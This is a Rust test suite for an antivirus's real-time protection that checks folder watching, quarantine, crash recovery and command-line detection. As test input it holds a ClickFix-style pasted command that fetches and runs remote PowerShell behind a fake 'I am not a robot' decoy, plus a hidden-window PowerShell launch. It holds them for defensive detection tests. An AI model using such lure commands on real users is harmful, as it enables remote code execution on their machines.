use super::*;
use crate::engine::EngineConfig;
use std::fs;

fn marker() -> String {
    "threat-scanner-test-marker-7f3a".to_ascii_uppercase()
}

fn config(folder: &Path) -> RtpConfig {
    let mut config = RtpConfig::new(vec![folder.to_path_buf()]);
    // Tests run in parallel; only the drive test watches for new drives.
    config.scan_new_drives = false;
    config.max_size_bytes = 1 << 20;
    config.settle = Duration::from_millis(400);
    config.defer_when_fullscreen = false;
    config
}

fn name(path: &Path) -> String {
    path.file_name().unwrap().to_string_lossy().into_owned()
}

fn describe(event: RtpEvent) -> String {
    match event {
        RtpEvent::Started { watching, programs, .. } => format!("started {watching} {programs}"),
        RtpEvent::FolderLost { folder, .. } => format!("lost {}", name(&folder)),
        RtpEvent::FolderRestored { folder } => format!("restored {}", name(&folder)),
        RtpEvent::FolderRescan { folder } => format!("rescan {}", name(&folder)),
        RtpEvent::Detection { report, processes } => {
            let stopped = processes.iter().filter(|p| matches!(p.stopped, Some(Ok(())))).count();
            format!("detected {} {} stopped={stopped} action={}", report.worst().threat, name(Path::new(&report.path)), report.action)
        }
        RtpEvent::Blocked { report, .. } => format!("blocked {}", name(Path::new(&report.path))),
        RtpEvent::Scanned { origin, report } => format!("scanned {origin:?} {}", report.stats.files_scanned),
        RtpEvent::RiskyFile { path, risk, .. } => format!("risky {} {}", name(&path), risk.disguise.is_some()),
        RtpEvent::RiskyChecked { path, outcome } => format!("checked {} {outcome:?}", name(&path)),
        RtpEvent::Command(hit) => {
            let rules: Vec<&str> = hit.matches.iter().map(|m| m.rule.as_str()).collect();
            format!("command {:?} {} {}", hit.source, hit.program.to_ascii_lowercase(), rules.join(","))
        }
        RtpEvent::DriveAdded { root, files } => format!("drive {} {files}", root.display()),
        RtpEvent::Restarting { error, .. } => format!("restarting {error}"),
        RtpEvent::Error(e) => format!("error {e}"),
    }
}

struct Run {
    handle: RtpHandle,
    rx: mpsc::Receiver<String>,
    seen: Vec<String>,
}

impl Run {
    fn start(data_dir: &Path, config: RtpConfig) -> Self {
        let engine = Arc::new(Engine::new(&EngineConfig::default()).unwrap());
        let (tx, rx) = mpsc::channel();
        let handle = start(engine, data_dir.to_path_buf(), config, move |e| {
            let _ = tx.send(describe(e));
        })
        .unwrap();
        Self { handle, rx, seen: Vec::new() }
    }

    /// Collects events until one satisfies `done` (or 20 s pass).
    fn until(&mut self, done: impl Fn(&str) -> bool) -> bool {
        let deadline = Instant::now() + Duration::from_secs(20);
        while Instant::now() < deadline {
            if let Ok(msg) = self.rx.recv_timeout(Duration::from_millis(200)) {
                let hit = done(&msg);
                self.seen.push(msg);
                if hit {
                    return true;
                }
            }
        }
        false
    }

    fn quiet_for(&mut self, duration: Duration) -> Vec<String> {
        let mut got = Vec::new();
        let deadline = Instant::now() + duration;
        while Instant::now() < deadline {
            if let Ok(msg) = self.rx.recv_timeout(Duration::from_millis(100)) {
                got.push(msg);
            }
        }
        got
    }
}

#[test]
fn new_threat_in_watched_folder_is_detected_once_settled() {
    let tmp = tempfile::tempdir().unwrap();
    let watched = tmp.path().join("Downloads");
    fs::create_dir_all(&watched).unwrap();
    let data_dir = tmp.path().join("data");
    let mut run = Run::start(&data_dir, config(&watched));
    assert!(run.until(|m| m.starts_with("started")));
    assert_eq!(run.seen[0], "started 1 false");

    // Simulate a browser download: partial name first, then the rename.
    let partial = watched.join("invoice.pdf.exe.crdownload");
    fs::write(&partial, format!("MZ... {}", marker())).unwrap();
    fs::write(watched.join("notes.txt"), "harmless").unwrap();
    std::thread::sleep(Duration::from_millis(200));
    fs::rename(&partial, watched.join("invoice.pdf.exe")).unwrap();

    assert!(run.until(|m| m.starts_with("checked invoice.pdf.exe")), "{:?}", run.seen);
    run.handle.stop();
    let seen = &run.seen;
    assert!(seen.iter().any(|s| s.starts_with("detected Test.ThreatScanner.Marker invoice.pdf.exe")), "{seen:?}");
    // The disguised program was announced once, under its final name only.
    let risky: Vec<&String> = seen.iter().filter(|s| s.starts_with("risky")).collect();
    assert_eq!(risky, ["risky invoice.pdf.exe true"], "{seen:?}");
    assert!(seen.iter().any(|s| s.starts_with("checked invoice.pdf.exe Threat")), "{seen:?}");

    let store = scan::open_store(&data_dir).unwrap();
    let rows = store.recent_scans(10, Some("watch")).unwrap();
    assert!(rows.iter().all(|r| r.threads == 1));
    let detections: Vec<_> = rows.iter().flat_map(|r| store.scan_detections(r.id).unwrap()).collect();
    assert!(detections.iter().any(|d| d.path.ends_with("invoice.pdf.exe")));
    assert!(detections.iter().all(|d| !d.path.ends_with(".crdownload")));
}

#[test]
fn catch_up_scans_files_changed_while_not_running() {
    let tmp = tempfile::tempdir().unwrap();
    let watched = tmp.path().join("w");
    fs::create_dir_all(&watched).unwrap();
    let mut cfg = config(&watched);
    cfg.catch_up_since = Some(SystemTime::now() - Duration::from_secs(60));
    fs::write(watched.join("arrived-while-off.txt"), marker()).unwrap();

    let mut run = Run::start(&tmp.path().join("data"), cfg);
    assert!(run.until(|m| m.starts_with("detected")), "{:?}", run.seen);
    assert!(run.seen.last().unwrap().contains("arrived-while-off.txt"));
}

#[test]
fn a_folder_moved_in_has_its_files_scanned() {
    let tmp = tempfile::tempdir().unwrap();
    let watched = tmp.path().join("w");
    let outside = tmp.path().join("outside");
    fs::create_dir_all(&watched).unwrap();
    fs::create_dir_all(outside.join("deep")).unwrap();
    fs::write(outside.join("deep").join("payload.txt"), marker()).unwrap();

    let mut run = Run::start(&tmp.path().join("data"), config(&watched));
    assert!(run.until(|m| m.starts_with("started")));
    // A move produces one event for the folder, none for what is inside.
    fs::rename(&outside, watched.join("extracted")).unwrap();
    assert!(run.until(|m| m.starts_with("detected")), "{:?}", run.seen);
    assert!(run.seen.last().unwrap().contains("payload.txt"));
}

#[test]
fn a_missing_folder_is_watched_once_it_appears() {
    let tmp = tempfile::tempdir().unwrap();
    let watched = tmp.path().join("later");
    let mut run = Run::start(&tmp.path().join("data"), config(&watched));
    assert!(run.until(|m| m.starts_with("started")));
    assert_eq!(run.seen[0], "started 0 false");

    fs::create_dir_all(&watched).unwrap();
    fs::write(watched.join("early.txt"), marker()).unwrap();
    assert!(run.until(|m| m.starts_with("restored later")), "{:?}", run.seen);
    // Written before watching resumed, so found by the catch-up.
    assert!(run.until(|m| m.starts_with("detected")), "{:?}", run.seen);

    // And it is really watched now.
    fs::write(watched.join("late.txt"), marker()).unwrap();
    assert!(run.until(|m| m.starts_with("detected") && m.contains("late.txt")), "{:?}", run.seen);
}

#[test]
fn an_unchanged_file_is_not_scanned_twice() {
    let tmp = tempfile::tempdir().unwrap();
    let watched = tmp.path().join("w");
    fs::create_dir_all(&watched).unwrap();
    let mut run = Run::start(&tmp.path().join("data"), config(&watched));
    assert!(run.until(|m| m.starts_with("started")));
    let file = watched.join("clean.txt");
    fs::write(&file, "nothing to see").unwrap();
    assert!(run.until(|m| m == "scanned Folder 1"), "{:?}", run.seen);

    // Renamed away and back: the same version of the same file, so the cache answers.
    fs::rename(&file, watched.join("elsewhere.bin")).unwrap();
    fs::rename(watched.join("elsewhere.bin"), &file).unwrap();
    let later = run.quiet_for(Duration::from_secs(3));
    // `elsewhere.bin` may or may not be seen, but clean.txt is not scanned again.
    assert!(later.iter().filter(|m| m.starts_with("scanned")).count() <= 1, "{later:?}");

    // A real change is scanned.
    fs::write(&file, format!("now {}", marker())).unwrap();
    assert!(run.until(|m| m.starts_with("detected")), "{:?}", run.seen);
}

#[cfg(windows)]
#[test]
fn a_detected_program_is_stopped_and_quarantined() {
    let tmp = tempfile::tempdir().unwrap();
    let data_dir = tmp.path().join("data");
    // A real, runnable program with the test marker appended (Windows
    // ignores data past the end of the image).
    let root = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
    let mut program = fs::read(Path::new(&root).join(r"System32\PING.EXE")).unwrap();
    program.extend_from_slice(marker().as_bytes());
    let exe = tmp.path().join("bad-ping.exe");
    fs::write(&exe, &program).unwrap();

    let mut cfg = RtpConfig::new(Vec::new());
    // Tests run in parallel; only the drive test watches for new drives.
    cfg.scan_new_drives = false;
    cfg.process_protection = true;
    // Command lines of whatever else runs on this PC are not this test's business.
    cfg.command_rules = false;
    cfg.quarantine_floor = Some(Category::Pup);
    cfg.defer_when_fullscreen = false;
    cfg.max_size_bytes = 1 << 20;
    let mut run = Run::start(&data_dir, cfg);
    assert!(run.until(|m| m.starts_with("started")));
    // The sweep of programs already running can report before this.
    assert_eq!(run.seen.last().unwrap(), "started 0 true");
    // Let the first look at running programs pass, so this one counts as new.
    std::thread::sleep(Duration::from_millis(1500));

    // Windows' own on-access scan of the new program can hold it for a
    // moment, longer while the whole suite runs in parallel.
    let start = || std::process::Command::new(&exe).args(["-n", "60", "127.0.0.1"]).stdout(std::process::Stdio::null()).spawn();
    let mut started = start();
    for _ in 0..20 {
        match &started {
            Err(e) if e.kind() == std::io::ErrorKind::PermissionDenied => {
                std::thread::sleep(Duration::from_millis(250));
                started = start();
            }
            _ => break,
        }
    }
    let mut child = started.unwrap();
    assert!(run.until(|m| m.starts_with("detected")), "{:?}", run.seen);
    let detection = run.seen.last().unwrap().clone();
    let status = child.wait().unwrap();
    run.handle.stop();
    assert!(detection.contains("bad-ping.exe stopped=1 action=program stopped; quarantined ("), "{detection}");
    assert!(!status.success());
    assert!(!exe.exists(), "the program file was quarantined");

    let store = scan::open_store(&data_dir).unwrap();
    let row = &store.recent_scans(5, Some("process")).unwrap()[0];
    assert_eq!(row.quarantined, 1);
    assert!(store.scan_detections(row.id).unwrap()[0].action.starts_with("program stopped; quarantined"));
}

#[test]
fn a_crashing_part_is_restarted() {
    let tmp = tempfile::tempdir().unwrap();
    let watched = tmp.path().join("w");
    fs::create_dir_all(&watched).unwrap();
    let engine = Arc::new(Engine::new(&EngineConfig::default()).unwrap());
    let (tx, rx) = mpsc::channel();
    let mut crashed = false;
    // The first Started event panics inside the folder monitor's thread.
    let handle = start(engine, tmp.path().join("data"), config(&watched), move |e| {
        let text = describe(e);
        let _ = tx.send(text.clone());
        if text.starts_with("started") && !crashed {
            crashed = true;
            panic!("simulated failure");
        }
    })
    .unwrap();
    let mut seen = Vec::new();
    let deadline = Instant::now() + Duration::from_secs(20);
    while Instant::now() < deadline && seen.iter().filter(|m: &&String| m.starts_with("started")).count() < 2 {
        if let Ok(m) = rx.recv_timeout(Duration::from_millis(200)) {
            seen.push(m);
        }
    }
    assert!(seen.iter().any(|m| m.starts_with("restarting folder-monitor crashed: simulated failure")), "{seen:?}");
    assert_eq!(seen.iter().filter(|m| m.starts_with("started")).count(), 2, "{seen:?}");

    // Still protecting after the restart.
    fs::write(watched.join("after.txt"), marker()).unwrap();
    let deadline = Instant::now() + Duration::from_secs(20);
    let mut detected = false;
    while Instant::now() < deadline && !detected {
        detected = rx.recv_timeout(Duration::from_millis(200)).is_ok_and(|m| m.starts_with("detected"));
    }
    handle.stop();
    assert!(detected);
}

#[test]
fn a_burst_of_files_is_scanned_without_losses() {
    let tmp = tempfile::tempdir().unwrap();
    let watched = tmp.path().join("w");
    fs::create_dir_all(&watched).unwrap();
    let mut run = Run::start(&tmp.path().join("data"), config(&watched));
    assert!(run.until(|m| m.starts_with("started")));
    // Like extracting a large archive: far more changes than one buffer holds.
    const FILES: i64 = 1500;
    for i in 0..FILES - 1 {
        fs::write(watched.join(format!("file-{i:04}-with-a-longish-name.txt")), format!("clean {i}")).unwrap();
    }
    fs::write(watched.join("zz-last.txt"), marker()).unwrap();

    let mut scanned = 0;
    let deadline = Instant::now() + Duration::from_secs(60);
    while Instant::now() < deadline && scanned < FILES {
        if let Ok(m) = run.rx.recv_timeout(Duration::from_millis(200)) {
            if let Some(n) = m.strip_prefix("scanned Folder ") {
                scanned += n.parse::<i64>().unwrap();
            }
            run.seen.push(m);
        }
    }
    assert_eq!(scanned, FILES, "{:?}", run.seen.iter().filter(|m| !m.starts_with("scanned")).collect::<Vec<_>>());
    assert!(run.seen.iter().any(|m| m.starts_with("detected") && m.contains("zz-last.txt")));
}

#[cfg(windows)]
#[test]
fn a_suspicious_command_line_is_reported_and_left_running() {
    use std::os::windows::process::CommandExt;
    let tmp = tempfile::tempdir().unwrap();
    let data_dir = tmp.path().join("data");
    let mut cfg = RtpConfig::new(Vec::new());
    // Tests run in parallel; only the drive test watches for new drives.
    cfg.scan_new_drives = false;
    cfg.process_protection = true;
    // Tests run in parallel: never stop another test's programs.
    cfg.stop_running_threats = false;
    cfg.defer_when_fullscreen = false;
    let mut run = Run::start(&data_dir, cfg);
    assert!(run.until(|m| m.starts_with("started")));
    std::thread::sleep(Duration::from_millis(1500));

    // Started through `cmd /c start`, so its parent is not this process:
    // children of Phalanx itself are never checked. A hidden window only:
    // Microsoft Defender blocks a hidden *encoded* command before it starts
    // (decoding is tested with the Run box below).
    let marker = format!("Start-Sleep -Seconds 20 # phalanx-test-{}", std::process::id());
    std::process::Command::new("cmd")
        .raw_arg(format!("/c start \"\" /b powershell -NoProfile -w hidden -c \"{marker}\""))
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
    // Other PowerShell processes on this PC may be reported too; wait for this one.
    let found = run.until(|m| m == "command Program powershell.exe powershell.hidden");
    let started = process::running()
        .unwrap()
        .into_iter()
        .filter(|p| process::command_line(&p.id).is_some_and(|c| c.contains(&marker)))
        .collect::<Vec<_>>();
    let still_running = !started.is_empty();
    for p in &started {
        let _ = process::terminate(&p.id);
    }
    run.handle.stop();
    assert!(found, "{:?}", run.seen);
    assert!(still_running, "report-only: the process is not stopped");

    // A hidden window alone is medium confidence: shown, not kept in history.
    let store = scan::open_store(&data_dir).unwrap();
    let recorded = store
        .recent_scans(20, Some("command"))
        .unwrap()
        .iter()
        .flat_map(|row| store.scan_detections(row.id).unwrap())
        .any(|d| d.threat == "CommandLine.powershell.hidden");
    assert!(!recorded);
}

#[test]
fn run_box_commands_are_checked_and_hidden_scripts_scanned() {
    let tmp = tempfile::tempdir().unwrap();
    let engine = Engine::new(&EngineConfig::default()).unwrap();
    let config = RtpConfig::new(Vec::new());
    let stop = AtomicBool::new(false);
    let cache = Mutex::new(DispositionCache::default());
    let recent = Mutex::new(commands::Recent::default());
    let events: EventSink = Mutex::new(Box::new(|_| {}));
    let ctx = Ctx { engine: &engine, data_dir: tmp.path(), config: &config, stop: &stop, halt: AtomicBool::new(false), cache: &cache, commands: &recent, excluded: &[], events: &events };

    let pasted = r#"powershell -w hidden -c "iex(irm https://x.test/v)" # I am not a robot - reCAPTCHA Verification ID: 4821"#;
    let hit = commands::check_run_box(&ctx, pasted, None).unwrap();
    let rules: Vec<&str> = hit.matches.iter().map(|m| m.rule.as_str()).collect();
    assert_eq!(rules[0], "clickfix.run-box");
    assert!(rules.contains(&"clickfix.decoy") && rules.contains(&"powershell.download-run"), "{rules:?}");
    assert_eq!(hit.confidence(), crate::cmdline::Confidence::High);
    assert!(commands::check_run_box(&ctx, "notepad", None).is_none());
    assert!(commands::check_run_box(&ctx, "cmd", None).is_none());
    assert!(commands::check_run_box(&ctx, "powershell", None).is_none());

    // The decoded script goes through the signatures.
    let payload = crate::system::encode_powershell(&format!("Write-Output '{}'", marker()));
    let hit = commands::check_run_box(&ctx, &format!("powershell -enc {payload}"), None).unwrap();
    assert!(hit.matches.iter().any(|m| m.rule == "signature.Test.ThreatScanner.Marker"), "{:?}", hit.matches);
    assert_eq!(hit.script.as_deref(), Some(format!("Write-Output '{}'", marker()).as_str()));
}

#[test]
fn only_confident_commands_are_kept_and_repeats_are_collapsed() {
    let tmp = tempfile::tempdir().unwrap();
    let engine = Engine::new(&EngineConfig::default()).unwrap();
    let config = RtpConfig::new(Vec::new());
    let stop = AtomicBool::new(false);
    let cache = Mutex::new(DispositionCache::default());
    let recent = Mutex::new(commands::Recent::default());
    let (tx, rx) = mpsc::channel();
    let events: EventSink = Mutex::new(Box::new(move |e| {
        let _ = tx.send(describe(e));
    }));
    let ctx = Ctx { engine: &engine, data_dir: tmp.path(), config: &config, stop: &stop, halt: AtomicBool::new(false), cache: &cache, commands: &recent, excluded: &[], events: &events };
    let store = scan::open_store(tmp.path()).unwrap();

    let high = commands::check_run_box(&ctx, "cmd /c ping -n 1 127.0.0.1 & rem I am not a robot - verification", None).unwrap();
    let medium = commands::check_run_box(&ctx, "powershell -NoProfile -w hidden -c Start-Sleep 1", None).unwrap();
    // The Run box makes anything high; a program match alone can be medium.
    let medium = CommandHit { source: CommandSource::Program, matches: medium.matches.into_iter().filter(|m| m.rule != "clickfix.run-box").collect(), ..medium };
    assert!(high.in_history() && !medium.in_history());
    for hit in [high.clone(), medium.clone(), high, medium] {
        commands::report(&ctx, &store, hit);
    }
    let seen: Vec<String> = rx.try_iter().collect();
    assert_eq!(seen.len(), 2, "repeats are collapsed: {seen:?}");
    let kept = store.recent_scans(10, Some("command")).unwrap();
    assert_eq!(kept.len(), 1, "only the high-confidence match is kept");
    assert_eq!(store.scan_detections(kept[0].id).unwrap()[0].threat, "CommandLine.clickfix.run-box");
}

#[test]
fn files_near_the_top_of_a_drive_are_picked_first() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    fs::create_dir_all(root.join("a/b/c")).unwrap();
    for (i, path) in ["top.exe", "a/one.txt", "a/b/two.txt", "a/b/c/deep.txt"].iter().enumerate() {
        fs::write(root.join(path), format!("{i}")).unwrap();
    }
    let found: Vec<String> = drives::top_files(root, 2, 10).iter().map(|p| name(p)).collect();
    assert_eq!(found, ["top.exe", "one.txt", "two.txt"], "two folder levels, not deeper");
    assert_eq!(drives::top_files(root, 2, 1).len(), 1);
}

/// A drive letter mapped to a folder with `subst` for the length of a test.
#[cfg(windows)]
struct Subst(char);

#[cfg(windows)]
impl Subst {
    fn new(folder: &Path) -> Option<Self> {
        let free = ('M'..='Y').rev().find(|c| !Path::new(&format!("{c}:\\")).exists())?;
        let ok = std::process::Command::new("subst").arg(format!("{free}:")).arg(folder).status().ok()?.success();
        ok.then_some(Self(free))
    }
}

#[cfg(windows)]
impl Drop for Subst {
    fn drop(&mut self) {
        let _ = std::process::Command::new("subst").arg(format!("{}:", self.0)).arg("/d").status();
    }
}

#[cfg(windows)]
#[test]
fn a_new_drive_is_checked_when_it_appears() {
    let tmp = tempfile::tempdir().unwrap();
    let image = tmp.path().join("image");
    fs::create_dir_all(&image).unwrap();
    fs::write(image.join("setup.exe"), format!("x {} y", marker())).unwrap();
    fs::write(image.join("readme.txt"), "fine").unwrap();

    let mut cfg = RtpConfig::new(Vec::new());
    cfg.defer_when_fullscreen = false;
    let mut run = Run::start(&tmp.path().join("data"), cfg);
    assert!(run.until(|m| m.starts_with("started")));
    // The drive monitor's first list of drives is what counts as already
    // there; wait a full poll so this drive is not taken for one of them.
    std::thread::sleep(Duration::from_millis(2500));

    // Like double-clicking an ISO: a new drive letter appears.
    let Some(drive) = Subst::new(&image) else { return };
    let root = format!("{}:\\", drive.0);
    let found = run.until(|m| m.starts_with("detected") && m.contains("setup.exe"));
    drop(drive);
    run.handle.stop();
    assert!(run.seen.contains(&format!("drive {root} 2")), "{:?}", run.seen);
    assert!(found, "{:?}", run.seen);
}

#[cfg(windows)]
#[test]
fn every_signed_in_persons_hive_is_watched_and_nothing_else() {
    for (name, person) in [
        ("S-1-5-21-1004336348-1177238915-682003330-1001", true),
        ("S-1-5-21-1004336348-1177238915-682003330-1001_Classes", false),
        ("S-1-5-18", false),
        ("S-1-5-19", false),
        (".DEFAULT", false),
    ] {
        assert_eq!(commands::is_user_hive(name), person, "{name}");
    }
}

#[cfg(windows)]
#[test]
fn the_run_box_view_finds_this_user() {
    // whoami /user /fo csv /nh → "desktop\me","S-1-5-21-…"
    let out = std::process::Command::new("whoami").args(["/user", "/fo", "csv", "/nh"]).output().unwrap();
    let text = String::from_utf8_lossy(&out.stdout);
    let sid = text.trim().rsplit(',').next().unwrap().trim_matches('"').to_string();
    let view = commands::run_box_view();
    let mine = view.hives.iter().find(|h| h.name == sid).unwrap_or_else(|| panic!("{sid} not in {:?}", view.hives.iter().map(|h| &h.name).collect::<Vec<_>>()));
    assert!(mine.person);
    assert!(mine.run_box.is_ok() || mine.run_box.as_ref().err().is_some_and(|e| e.contains("cannot find")), "{:?}", mine.run_box);
}
